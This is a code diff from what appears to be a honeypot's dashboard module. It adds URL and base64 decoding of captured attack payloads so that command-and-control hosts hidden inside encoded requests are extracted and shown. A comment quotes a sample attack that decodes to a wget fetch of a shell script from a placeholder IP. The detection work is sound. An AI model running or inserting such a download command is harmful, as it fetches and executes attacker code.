@@ -56,6 +56,7 @@ from manyfaced.common import ports as _ports
 from manyfaced.db import storage as _storage
 from manyfaced.web import dashboard_data as _data
 from manyfaced.web import dashboard_render as _render
+from manyfaced.web.payload_decode import decode_payload  # noqa: F401 (issue #368)
 
 logger = logging.getLogger(__name__)
 # Separate logger so dashboard access doesn't pollute bear captures.
@@ -229,7 +230,11 @@ def _extract_c2_hosts(store: Any, since: str | None, top_n: int = _C2_TOP_N) -> 
         return []
     counts: Counter[str] = Counter()
     for raw in rows:
-        for m in _C2_HOST_RE.finditer(raw or ''):
+        # Issue #368: decode URL/base64 first so IOCs hidden inside encoded
+        # payloads (e.g. `%ADd+...%3dphp://input` -> `wget https://1.2.3.4/sh`)
+        # are extracted, not missed by the raw-byte scan.
+        decoded = decode_payload(raw or '')
+        for m in _C2_HOST_RE.finditer(decoded):
             host = m.group(1)
             if _is_plausible_c2_host(host):
                 counts[host] += 1
@@ -289,6 +294,11 @@ def _build_payloads(rows: list[dict]) -> list[str]:
     Drops benign-scanner rows (already excluded in SQL) plus favicon/noise
     probes, then ranks survivors by severity (crit > warn > info) and recency
     and truncates the top ``_PAYLOADS_LIMIT`` for display.
+
+    Returns a list of ``(raw, decoded)`` tuples (issue #368): ``decoded`` is the
+    best-effort URL/base64-decoded view (or the same string when nothing
+    decoded). The render shows both panes; when they're identical the decoded
+    pane collapses to a hint.
     """
     survivors = [
         r for r in rows if r.get('classification') != 'benign' and not _is_payload_noise(r)
@@ -297,7 +307,12 @@ def _build_payloads(rows: list[dict]) -> list[str]:
         key=lambda r: (_SEV_RANK.get(_data.severity_for(r), 0), r.get('raw') or ''),
         reverse=True,
     )
-    return [_truncate_payload(r['raw']) for r in survivors[:_PAYLOADS_LIMIT]]
+    out: list[tuple[str, str]] = []
+    for r in survivors[:_PAYLOADS_LIMIT]:
+        raw = _truncate_payload(r['raw'])
+        decoded = _truncate_payload(decode_payload(r['raw'] or ''))
+        out.append((raw, decoded))
+    return out
 
 
 def _build_payload(
